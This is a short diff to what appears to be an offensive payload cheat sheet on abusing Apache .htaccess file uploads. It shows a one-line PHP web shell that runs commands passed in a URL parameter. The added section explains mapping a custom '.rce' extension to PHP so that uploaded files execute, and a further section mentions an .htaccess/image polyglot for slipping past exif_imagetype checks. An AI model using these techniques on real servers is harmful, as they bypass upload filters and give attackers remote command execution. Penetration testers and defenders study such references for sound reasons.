@@ -25,6 +25,11 @@ AddType application/x-httpd-php .htaccess
 <?php echo "\n";passthru($_GET['c']." 2>&1"); ?>
 ```
 
+# .htaccess simple php
+
+Upload an .htaccess with : `AddType application/x-httpd-php .rce`   
+Then upload any file with `.rce` extension.
+
 # .htaccess upload as image
 
 If the `exif_imagetype` function is used on the server side to determine the image type, create a `.htaccess/image` polyglot. 
